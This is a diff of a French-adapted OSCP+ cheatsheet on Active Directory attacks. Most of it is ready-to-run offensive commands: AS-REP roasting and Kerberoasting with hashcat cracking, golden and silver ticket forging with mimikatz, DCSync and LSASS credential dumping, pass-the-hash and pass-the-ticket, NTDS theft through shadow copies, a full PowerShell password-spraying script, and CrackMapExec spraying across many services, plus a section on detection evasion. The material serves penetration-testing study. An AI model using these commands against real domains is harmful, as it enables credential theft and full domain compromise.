@@ -10,23 +10,22 @@ description: "Étudier les mécanismes d'authentification et les techniques AD."
 
 ## AS-REP Roasting
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Analyser une empreinte avec le mode indiqué.
 
-```text
-hashcat
-```
-
-
-```text
+```bash
 John the Ripper
 ```
 
+
+Examiner les informations AD ou réseau en PowerShell.
 
 ```powershell
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth
 ```
 
+
+Commande `rubeus.exe` pour la rubrique « AS-REP Roasting ».
 
 ```powershell
 Rubeus.exe asreproast
@@ -35,6 +34,8 @@ Rubeus.exe asreproast
 Rubeus.exe asreproast /nowrap
 ```
 
+
+Commande `impacket-getnpusers` pour la rubrique « AS-REP Roasting ».
 
 ```bash
 # From Kali (GetNPUsers.py)
@@ -45,6 +46,8 @@ GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
 ```
 
 
+Analyser une empreinte avec le mode indiqué.
+
 ```bash
 hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
 ```
@@ -52,23 +55,20 @@ hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
 
 ## Kerberoasting
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-hashcat
-```
-
+Commande `getuserspns.py` pour la rubrique « Kerberoasting ».
 
 ```powershell
 GetUserSPNs.py domain/[user]:[password]@[dc-ip]
 ```
 
 
+Commande `impacket-getuserspns` pour la rubrique « Kerberoasting ».
+
 ```bash
 # From Kali
 sudo impacket-GetUserSPNs -request -dc-ip [dc-ip] [domain.com]/[user]
-or
+# Autre possibilité
 sudo impacket-GetUserSPNs -request -dc-ip [dc_ip] [domain.com]/[user] -hashes [LMHASH]:[NTHASH] -outputfile [output_file]
 
 # From Windows
@@ -76,27 +76,31 @@ GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
 ```
 
 
+Commande `rubeus.exe` pour la rubrique « Kerberoasting ».
+
 ```powershell
 Rubeus.exe kerberoast
-or
+# Autre possibilité
 Rubeus.exe kerberoast /outfile:[output_file].kerberoast
 ```
 
+
+Analyser une empreinte avec le mode indiqué.
 
 ```bash
 hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
 ```
 
 
-## Silver Tickets
+## Tickets Silver
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Examiner les informations AD ou réseau en PowerShell.
 
 ```powershell
 # 1. Find the [ServiceAccountName]
 Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
-or
+# Autre possibilité
 Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
 
 # 2. Extract the NTLM hash
@@ -107,15 +111,17 @@ mimikatz # lsadump::dcsync /user:HTTP/server01
 ```
 
 
+Exemple technique pour la rubrique « Tickets Silver ».
+
 ```powershell
 # 1. Find the Domain SID
 (Get-ADDomain).DomainSID
-or
+# Autre possibilité
 whoami /user
 
 # 2. Find the target server (my DC server)
 Get-ADDomainController -Filter *
-or
+# Autre possibilité
 netdom query dc
 
 # 3. Create the Silver Ticket, for example in this case /service:CIFS (for help deciding the /service, check Section 12.11)
@@ -126,6 +132,8 @@ mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domai
 ```
 
 
+Commande `mimikatz` pour la rubrique « Tickets Silver ».
+
 ```powershell
 mimikatz # kerberos::ptt silver_ticket.kirbi
 
@@ -134,30 +142,33 @@ klist
 ```
 
 
+Commande `dir` pour la rubrique « Tickets Silver ».
+
 ```bash
 dir \\targetserver\sharedfolder
 ```
 
 
-## Golden Tickets
-
-Commandes, paramètres et exemples associés à cette technique.
+## Tickets Golden
 
 
-```text
-Mimikatz
-```
+**Paramètres et repères :**
+`Mimikatz`  
 
+
+Commande `mimikatz` pour la rubrique « Tickets Golden ».
 
 ```powershell
 mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
 ```
 
 
+Exemple technique pour la rubrique « Tickets Golden ».
+
 ```powershell
 # 1. Find the Domain SID
 (Get-ADDomain).DomainSID
-or
+# Autre possibilité
 whoami /user
 
 # 2. Find the RID: The RID for the Administrator account is 500, but other accounts will have different RIDs. You can find the RID of a specific user using tools like Mimikatz or by querying Active Directory.
@@ -165,10 +176,12 @@ PowerShell -Command "(New-Object System.Security.Principal.NTAccount('domain\Ser
 
 # 3. Create the Ticket
 mimikatz # kerberos::golden /user:[DesiredUsername] /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:[DesiredRID]
-or
+# Autre possibilité
 mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500
 ```
 
+
+Commande `mimikatz` pour la rubrique « Tickets Golden ».
 
 ```powershell
 mimikatz # kerberos::ptt golden_ticket.kirbi
@@ -177,6 +190,8 @@ mimikatz # kerberos::ptt golden_ticket.kirbi
 klist
 ```
 
+
+Commande `net` pour la rubrique « Tickets Golden ».
 
 ```bash
 net use \\domaincontroller\C$ /user:[DesiredUsername]
@@ -188,10 +203,14 @@ net use \\domaincontroller\C$ /user:[DesiredUsername]
 Examiner les objets, les droits et les services du domaine.
 
 
+Examiner les informations AD ou réseau en PowerShell.
+
 ```powershell
 Get-ADGroupMember -Identity "Domain Admins"
 ```
 
+
+Commande `impacket-secretsdump` pour la rubrique « Domain Controller Synchronization (DC Sync) ».
 
 ```powershell
 # From Kali
@@ -206,10 +225,14 @@ mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
 ```
 
 
+Commande `mimikatz` pour la rubrique « Domain Controller Synchronization (DC Sync) ».
+
 ```powershell
 mimikatz # lsadump::dcsync /domain:[domain.com]
 ```
 
+
+Commande `mimikatz` pour la rubrique « Domain Controller Synchronization (DC Sync) ».
 
 ```powershell
 # You can redirect output to a file for analysis:
@@ -217,15 +240,19 @@ mimikatz # lsadump::dcsync /domain:domain.com > output.txt
 ```
 
 
+Analyser une empreinte avec le mode indiqué.
+
 ```bash
 hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
 ```
 
 
-## Cached AD Credentials
+## Identifiants AD en cache
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
+
+Commande `mimikatz` pour la rubrique « Identifiants AD en cache ».
 
 ```powershell
 mimikatz # privilege::debug
@@ -250,71 +277,71 @@ mimikatz # lsadump::cache
 ```
 
 
+Analyser une empreinte avec le mode indiqué.
+
 ```bash
 hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
 ```
 
 
-## NTLM Authentication
-
-Commandes, paramètres et exemples associés à cette technique.
-
+## Authentification NTLM
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ntlm_authentication.png)
 
+
+Commande `mimikatz` pour la rubrique « Authentification NTLM ».
 
 ```powershell
 mimikatz # sekurlsa::logonpasswords
 ```
 
 
+Commande `mimikatz` pour la rubrique « Authentification NTLM ».
+
 ```powershell
 mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]
 ```
 
+
+Commande `dir` pour la rubrique « Authentification NTLM ».
 
 ```bash
 dir \\targetserver\sharedfolder
 ```
 
 
-## Kerberos Authentication
+## Authentification Kerberos
 
 Examiner les objets, les droits et les services du domaine.
 
-
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/kerberos_authentication.jpg)
 
+
+Commande `mimikatz` pour la rubrique « Authentification Kerberos ».
 
 ```powershell
 mimikatz # sekurlsa::tickets /export
 ```
 
 
+Commande `mimikatz` pour la rubrique « Authentification Kerberos ».
+
 ```powershell
 mimikatz # kerberos::ptt TGT_ticket.kirbi
 ```
 
+
+Commande `dir` pour la rubrique « Authentification Kerberos ».
 
 ```bash
 dir \\targetserver\sharedfolder
 ```
 
 
-## Attaques sur les mots de passe
-
-Commandes, paramètres et exemples associés à cette technique.
+#### Exécuter le script
 
 
-### Spraying Creds with Script
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
-#### Running the Script
-
-Commandes, paramètres et exemples associés à cette technique.
-
+Commande `.` pour la rubrique « Exécuter le script ».
 
 ```powershell
 # -Pass allow us to use a single password to test.
@@ -326,8 +353,8 @@ Commandes, paramètres et exemples associés à cette technique.
 
 #### Code source of the Script
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Code source of the Script ».
 
 ```powershell
 <#
@@ -663,7 +690,6 @@ Function BruteForce
                             Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
 
 
-
                                    # Try the auth with current password
                                 $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
 
@@ -680,7 +706,6 @@ Function BruteForce
                                     $numTry[$i] += 1
                                     If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                 }
-
 
 
                         } # Badpwdtime-check if
@@ -749,13 +774,12 @@ BruteForce $duration $threshold $passwords
 
 ### Authenticating using DirectoryEntry
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`System.DirectoryServices`  
 
 
-```text
-System.DirectoryServices
-```
-
+Exemple technique pour la rubrique « Authenticating using DirectoryEntry ».
 
 ```powershell
 # Fetch the current domain object
@@ -777,39 +801,39 @@ $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, 
 ```
 
 
-### Using CrackMapExec
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 #### Commandes de base
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --continue-on-success
-or
+# Autre possibilité
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --password-spray
-or
+# Autre possibilité
 crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com]
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com] --kerberos
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --signing
 ```
 
 
-```text
---continue-on-error
-```
+**Paramètres et repères :**
+`--continue-on-error`  
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --continue-on-error
@@ -818,28 +842,36 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 #### Commandes complémentaires
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --shares
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --smbv1
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --sessions
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec smb [ip/domain] -u Administrator -p '[AdminPassword]!' -d [domain.com] --sam
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [ip/domain] -u [userName] -p '[password]!' -d [domain.com] --exec-command "[command]"
@@ -848,93 +880,127 @@ crackmapexec smb [ip/domain] -u [userName] -p '[password]!' -d [domain.com] --ex
 
 #### Possible Services to Test
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec rdp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec winrm [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec http [ip/domain] -u [userName] -p '[password]'
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec ftp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec telnet [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smtp [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec dns [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec ldap [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec netbios [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec mysql [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec postgres [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec mssql [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec oracle [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec redis [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec docker [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec snmp [ip/domain] -u [users_file].txt -p '[password]'
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec ntp [ip/domain]
@@ -943,8 +1009,8 @@ crackmapexec ntp [ip/domain]
 
 ### Using kerbrute
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `.` pour la rubrique « Using kerbrute ».
 
 ```powershell
 # The executable can be found in the kerbrute GitHub (link in Section 18.3.2.2).
@@ -954,8 +1020,8 @@ Commandes, paramètres et exemples associés à cette technique.
 
 ## Shadow Copies
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `vshadow.exe` pour la rubrique « Shadow Copies ».
 
 ```powershell
 # -p X: this indicates which disk we wanto to copy, usually is C.
@@ -963,10 +1029,11 @@ vshadow.exe -nw -p C:
 ```
 
 
-```text
-C:
-```
+**Paramètres et repères :**
+`C:`  
 
+
+Commande `copy` pour la rubrique « Shadow Copies ».
 
 ```powershell
 # Replace X with the shadow copy number, found in the previous command
@@ -977,6 +1044,8 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\nt
 ```
 
 
+Commande `reg.exe` pour la rubrique « Shadow Copies ».
+
 ```powershell
 reg.exe save hklm\system C:\backup_path\system.bak
 
@@ -984,6 +1053,8 @@ reg.exe save hklm\system C:\backup_path\system.bak
 C:\> reg.exe save hklm\system c:\system.bak
 ```
 
+
+Commande `impacket-secretsdump` pour la rubrique « Shadow Copies ».
 
 ```bash
 impacket-secretsdump -ntds [ntds_file] -system [system_file] LOCAL
@@ -993,15 +1064,21 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 
 
+Commande `mimikatz` pour la rubrique « Shadow Copies ».
+
 ```powershell
 mimikatz # lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"
 ```
 
 
+Commande `vssadmin` pour la rubrique « Shadow Copies ».
+
 ```powershell
 vssadmin list shadows
 ```
 
+
+Commande `mklink` pour la rubrique « Shadow Copies ».
 
 ```powershell
 # Replace X with the shadow copy number.
@@ -1009,10 +1086,14 @@ mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
 ```
 
 
+Commande `c` pour la rubrique « Shadow Copies ».
+
 ```text
 C:\ShadowCopy
 ```
 
+
+Commande `dir` pour la rubrique « Shadow Copies ».
 
 ```powershell
 dir C:\ShadowCopy
@@ -1021,77 +1102,34 @@ dir C:\ShadowCopy
 
 ## Constrained Delegation Attack
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Examiner les informations AD ou réseau en PowerShell.
 
 ```powershell
 Get-ADComputer -Filter {ServicePrincipalName -like "*"} -Property ServicePrincipalName | Select-Object Name,ServicePrincipalName
 ```
 
 
+Examiner les informations AD ou réseau en PowerShell.
+
 ```powershell
 Get-ADUser -Identity <ServiceAccount> -Properties msDS-AllowedToDelegateTo
 ```
 
+
+Commande `kinit` pour la rubrique « Constrained Delegation Attack ».
 
 ```bash
 kinit <ServiceAccount>
 ```
 
 
-## Enum, Creds Spraying, and Post-Enum Techniques
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ### Key Énumération Tools
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-CrackMapExec
-```
-
-
-```text
-enum4linux
-```
-
-
-```text
-ldapsearch
-```
-
-
-```text
-rpcclient
-```
-
-
-```text
-smbclient
-```
-
-
-```text
-BloodHound
-```
-
-
-```text
-Impacket
-```
-
-
-```text
-Responder
-```
-
-
-```text
-PowerView
-```
+**Paramètres et repères :**
+`CrackMapExec` · `rpcclient` · `smbclient` · `BloodHound`  
+`Impacket` · `Responder` · `PowerView`  
 
 
 ### Workflow for Énumération and Credential Testing
@@ -1099,34 +1137,19 @@ PowerView
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-```bash
-nmap
-```
+**Paramètres et repères :**
+`nmap`  
 
+
+Identifier les versions des services.
 
 ```bash
 nmap -p 88,135,139,389,445,5985,636,3268 -sC -sV -Pn [IP]
 ```
 
 
-```text
-enum4linux
-```
-
-
-```text
-ldapsearch
-```
-
-
-```text
-CrackMapExec
-```
-
-
-```text
-CrackMapExec
-```
+**Paramètres et repères :**
+`CrackMapExec`  
 
 
 ### Port Reference Table
@@ -1179,20 +1202,21 @@ RDP · Remote Desktop Protocol.
 WinRM · Windows Remote Management.
 
 
-### Additional Énumération Techniques
+### Complémentaire Énumération Techniques
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `responder` pour la rubrique « Complémentaire Énumération Techniques ».
 
 ```bash
 responder -I eth0
 ```
 
 
-```text
-secretsdump.py
-```
+**Paramètres et repères :**
+`secretsdump.py`  
 
+
+Commande `secretsdump.py` pour la rubrique « Complémentaire Énumération Techniques ».
 
 ```bash
 # Same tool as impacket-secretsdump
@@ -1200,15 +1224,21 @@ secretsdump.py [domain].com/[VALID_USERNAME]:[VALID_PASSWORD]@[IP]
 ```
 
 
+Examiner les informations AD ou réseau en PowerShell.
+
 ```powershell
 Get-ADUser -Filter * | Select-Object Name, SamAccountName
 ```
 
 
+Commande `find-domainshare` pour la rubrique « Complémentaire Énumération Techniques ».
+
 ```text
 Find-DomainShare -Writable
 ```
 
+
+Examiner les informations AD ou réseau en PowerShell.
 
 ```powershell
 Get-ADGroupMember -Identity "Domain Admins"
@@ -1217,27 +1247,20 @@ Get-ADGroupMember -Identity "Domain Admins"
 
 ### Detection Evasion Techniques
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`CrackMapExec`  
 
 
-```text
-CrackMapExec
-```
-
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --shares --rate 1
 ```
 
 
-```text
-ldapsearch
-```
-
-
-```text
-rpcclient
-```
+**Paramètres et repères :**
+`rpcclient`  
 
 
 ### Web Interfaces for Domain Énumération
@@ -1245,15 +1268,21 @@ rpcclient
 Examiner les objets, les droits et les services du domaine.
 
 
+Examiner le service avec les scripts NSE sélectionnés.
+
 ```bash
 nmap -p 3389 --script rdp-ntlm-info [IP]
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec winrm [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --exec-method invoke_command
 ```
 
+
+Interroger les objets de l'annuaire LDAP.
 
 ```bash
 ldapsearch -x -h [IP] -p 9389
@@ -1262,13 +1291,8 @@ ldapsearch -x -h [IP] -p 9389
 
 ### Sample Outputs
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-enum4linux
-```
-
+Commande `domain` pour la rubrique « Sample Outputs ».
 
 ```text
 Domain Name: DOMAIN.LOCAL
@@ -1279,20 +1303,18 @@ Users:
 ```
 
 
-```text
-CrackMapExec
-```
+**Paramètres et repères :**
+`CrackMapExec`  
 
+
+Commande `192.168.123.10` pour la rubrique « Sample Outputs ».
 
 ```text
 192.168.123.10 - SMB         [*] domain.local\esolis:Password2024! (Pwned!)
 ```
 
 
-```text
-ldapsearch
-```
-
+Commande `dn` pour la rubrique « Sample Outputs ».
 
 ```text
 dn: CN=Emma Solis,OU=Users,DC=domain,DC=local
@@ -1302,8 +1324,6 @@ userPrincipalName: esolis@domain.local
 
 
 ## Pass-the-Ticket (PtT)
-
-Commandes, paramètres et exemples associés à cette technique.
 
 
 **Active TGT in Memory**
@@ -1321,6 +1341,8 @@ Needed to access LSASS memory where Kerberos tickets are stored.
 Often sufficient, as it allows escalation to SYSTEM or LSASS access tools.
 
 
+Commande `mimikatz` pour la rubrique « Pass-the-Ticket (PtT) ».
+
 ```powershell
 mimikatz
 privilege::debug
@@ -1328,21 +1350,26 @@ sekurlsa::tickets
 ```
 
 
+Commande `sekurlsa` pour la rubrique « Pass-the-Ticket (PtT) ».
+
 ```powershell
 # This will save .kirbi files to disk. Identify the correct TGT based on the user and encryption type.
 sekurlsa::tickets /export
 ```
 
 
+Commande `kerberos` pour la rubrique « Pass-the-Ticket (PtT) ».
+
 ```powershell
 kerberos::ptt C:\path\to\admin_ticket.kirbi
 ```
 
 
-```powershell
-klist
-```
+**Paramètres et repères :**
+`klist`  
 
+
+Commande `wmic` pour la rubrique « Pass-the-Ticket (PtT) ».
 
 ```powershell
 # From Windows
@@ -1360,6 +1387,8 @@ Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential
 ```
 
 
+Commande `kirbi2ccache` pour la rubrique « Pass-the-Ticket (PtT) ».
+
 ```bash
 # From Kali
 
@@ -1374,7 +1403,8 @@ psexec.py -k -no-pass [domain]/[username]@[target_host]
 evil-winrm -k -no-pass -u [username] -d [domain] -i [target_host]
 ```
 
-
 ---
 
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
+
+<!-- refined-oscp -->
